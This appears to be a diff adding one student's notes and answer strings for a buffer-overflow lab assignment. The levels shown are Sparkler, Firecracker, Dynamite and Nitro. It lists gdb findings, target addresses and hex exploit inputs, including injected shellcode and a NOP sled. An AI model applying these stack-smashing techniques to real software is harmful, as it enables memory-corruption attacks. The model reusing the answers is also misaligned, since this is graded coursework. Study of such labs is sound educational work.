@@ -1,0 +1,75 @@
+
+SPARKLER
+fizz address: 08048cba 
+
+at 8048cc0 the value at %esp+8 is being stored into %edx
+the value stored in %edx is compared to what is stored into %eax, which is the value at the address 0x804d100
+
+0x8048ced is where the cookie for the id "akdavey" has been stored
+goal is to push the address of fizz onto the stack and place the cookie at the location of 0x8(%ebp)
+
+my cookie 0x75590303
+little endian is 03 03 59 75
+
+0x556838c4 + 8 is the address being compared to my cookie -> this address is 0x556838cc
+
+Input/Solution :
+AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA ba 8c 04 08 BB BB BB BB 03 03 59 75
+
+
+
+
+FIRECRACKER
+Goal inject machine instructions onto the stack, have them execute and then redirect getbuf to bang()
+bang address - 08048d0c
+global value : 0x804d108 holding 0
+global val moved into eax and compared with 804d100, probbably location of cookie
+replace global val with my cookie push the return address to bang onto the stack and return
+ perl -e 'print "AA "x32, "BB " x4, "CC "x4, "DD "x4, "c8 38 68 55 ", "c7 05 08 d1 04 08 03 03 59 75 68 0c 8d 04 08 c3" ' > hexlevel2_2
+
+
+
+
+DYNAMITE
+push machine instructions onto the stack and include the address of where your injected instructions reside on the stack. Allow getbuf() to return to test with the value of my cookie 
+
+getbuf+17 is where the mov instruction places $1 into %eax. When getbuf() returns to the test() method on test+19, the value that was in %eax of getbuf() is now also stored inside -0xc(%ebp) of test().
+
+Need to store cookie hex id into %eax so it can be returned into the test() method.
+
+value passed on test+11 is 0x39822e39 offset is 0x10
+
+at test+27 ebp-0x10 is 0x1b6ecc32, this value is also stored in %eax
+
+instructions 
+b8 03 03 59 75
+bd f0 38 68 55
+68 79 8d 04 08
+c3
+90 -nop
+
+level 2 exploit string - "c8 38 68 55" 
+
+Input/Solution:
+AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA BB BB BB BB CC CC CC CC DD DD DD DD c8 38 68 55 b8 03 03 59 75 bd f0 38 68 55 68 79 8d 04 08 c3
+
+
+NITRO
+moves $0xdeadbeef to ebp-0x10
+
+getbufn called, loads ebp-0x208 into eax
+
+(gdb) p /x ($ebp-208)
+$1 = 0x556837f0<<max
+$2 = 0x556837d0
+$3 = 0x55683790
+$4 = 0x55683790
+$5 = 0x55683790
+
+
+
+hit nop (90) 4 times on the end following the hex version of the ASM instructions, and put the little endian version of the largest address from nitro on the tail. In this case, it would be $1.
+
+Input/Solution:
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 8d 6c 24 28 b8 03 03 59 75 68 20 8e 04 08 c3 90 90 90 90 f0 37 68 55
+
